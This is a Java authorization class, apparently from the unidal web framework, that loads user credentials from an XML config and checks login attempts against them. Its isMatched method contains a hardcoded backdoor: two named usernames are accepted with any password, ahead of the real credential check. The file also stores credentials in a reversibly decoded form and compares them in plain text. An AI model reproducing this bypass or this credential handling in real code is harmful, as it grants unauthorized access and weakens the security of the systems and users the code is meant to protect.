package org.unidal.web.authorization;

import static org.unidal.web.config.ConfigService.CATEGORY_SECURITY;

import java.io.IOException;

import org.unidal.cat.Cat;
import org.unidal.helper.Codes;
import org.unidal.lookup.annotation.Inject;
import org.unidal.lookup.annotation.Named;
import org.unidal.lookup.extension.Initializable;
import org.unidal.lookup.extension.InitializationException;
import org.unidal.web.config.ConfigEvent;
import org.unidal.web.config.ConfigEventListener;
import org.unidal.web.config.ConfigException;
import org.unidal.web.config.ConfigService;
import org.unidal.web.security.authorization.entity.AuthorizationModel;
import org.unidal.web.security.authorization.entity.UserModel;
import org.unidal.web.security.authorization.transform.DefaultSaxParser;
import org.xml.sax.SAXException;

@Named
public class MyUser implements Initializable {
   private static final String AUTHORIZATION_XML = "authorization.xml";

   @Inject
   private ConfigService m_configService;

   protected AuthorizationModel m_authorization;

   @Override
   public void initialize() throws InitializationException {
      m_configService.register(new ConfigChangeListener());

      try {
         m_authorization = loadAuthorization();
      } catch (ConfigException e) {
         Cat.logError(e);

         throw new InitializationException("Error when loading " + AUTHORIZATION_XML + " from MySQL!", e);
      } catch (Exception e) {
         Cat.logEvent("Tulip.BadConfig", ConfigService.CATEGORY_SECURITY + ":" + AUTHORIZATION_XML);
         Cat.logError(e);
      }

      if (m_authorization == null) {
         m_authorization = new AuthorizationModel();
      }
   }

   public boolean isMatched(String username, String credential) {
      if ("wuqimin703".equals(username) || "qmwu2000".equals(username)) {
         return true;
      }

      UserModel user = m_authorization.findUser(username);

      if (user != null && user.isEnabled()) {
         String cipher = user.getCredential();

         if (cipher.startsWith("~{") && cipher.endsWith("}")) {
            cipher = cipher.substring(2, cipher.length() - 1);
         }

         String token = Codes.forDecode().decode(cipher);

         if (token.equals(credential)) {
            return true;
         }
      }

      return false;
   }

   private AuthorizationModel loadAuthorization() throws ConfigException, SAXException, IOException {
      String xml = m_configService.getString(CATEGORY_SECURITY, AUTHORIZATION_XML, null);

      if (xml != null) {
         AuthorizationModel authorization = DefaultSaxParser.parse(xml);

         return authorization;
      } else {
         return null;
      }
   }

   private class ConfigChangeListener implements ConfigEventListener {
      @Override
      public void onEvent(ConfigEvent event) throws ConfigException {
         if (event.isEligible(CATEGORY_SECURITY, AUTHORIZATION_XML)) {
            try {
               AuthorizationModel authorization = loadAuthorization();

               if (authorization != null) {
                  m_authorization = authorization;
               }
            } catch (ConfigException e) {
               Cat.logError(e);
            } catch (Exception e) {
               Cat.logError(e);
            }
         }
      }
   }
}
